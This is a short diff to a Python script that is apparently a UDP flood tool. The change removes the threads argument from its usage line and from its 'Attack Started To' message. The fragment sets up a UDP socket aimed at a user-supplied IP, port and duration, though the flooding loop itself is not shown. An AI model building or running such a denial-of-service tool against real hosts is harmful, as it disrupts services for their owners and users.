@@ -19,14 +19,13 @@ def banner():
 threads = []
 
 banner()
-if len(sys.argv) !=5:
-    print(f"Use: python3 {sys.argv[0]} <ip> <port> <time> <threads>")
+if len(sys.argv) !=4:
+    print(f"Use: python3 {sys.argv[0]} <ip> <port> <time>")
     sys.exit(1)
     
 target=sys.argv[1]
 port=sys.argv[2]
 timer = int(sys.argv[3])
-threads = int(sys.argv[4])
 
 #create socket, packet
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
@@ -36,7 +35,7 @@ attack_port = int(port)
 
 sent = 0 
 standard_time = time.time()
-print (f'Attack Started To: {target}:{port} Time: {timer} Threads: {threads}')
+print (f'Attack Started To: {target}:{port} Time: {timer}')
 standard_time = time.time()
 
 #def run():
